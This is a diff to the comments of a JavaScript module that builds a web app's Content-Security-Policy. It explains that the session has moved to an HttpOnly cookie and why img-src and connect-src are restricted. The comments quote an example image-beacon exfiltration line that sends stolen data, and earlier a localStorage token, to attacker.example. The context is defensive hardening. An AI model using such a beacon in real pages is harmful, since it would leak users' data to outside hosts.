@@ -7,8 +7,9 @@
 // a template by `render-serve-json.mjs` rather than shipped as a literal. The
 // alternative the app used to send, `connect-src 'self' http: https: ws: wss:`,
 // allows fetch/WebSocket to *any* host, which defeats the exfiltration
-// protection the README's Security section credits the CSP with providing for
-// the localStorage-token tradeoff.
+// protection the README's Security section credits the CSP with providing. The
+// session itself is an HttpOnly cookie script cannot read, but injected script
+// can still read the user's data through the API and post *that* somewhere.
 
 import { createHash } from "node:crypto";
 import { IMAGE_CDN_ORIGINS } from "../src/image-cdn-hosts.mjs";
@@ -84,11 +85,12 @@ export const buildConnectSrc = ({ apiBase, addonBase, sentryDsn, extra } = {}) =
  * every host on the web — and an <img> is a request, so it exfiltrates just as
  * well as a fetch does:
  *
- *     new Image().src = "https://attacker.example/?t=" + localStorage.fetch_token;
+ *     new Image().src = "https://attacker.example/?d=" + encodeURIComponent(stolen);
  *
- * The bearer token lives in localStorage by design, and `connect-src` was
- * tightened precisely so injected script could not post it anywhere. Leaving
- * `img-src` open left that door on the latch.
+ * The session is an HttpOnly cookie now, out of script's reach, but whatever
+ * injected script reads through the API with it is not, and `connect-src` was
+ * tightened precisely so it could not post that anywhere. Leaving `img-src`
+ * open left that door on the latch.
  *
  * Every picture the app renders — posters, backdrops, provider logos, cast
  * photos — comes from one of the artwork CDNs, so naming them
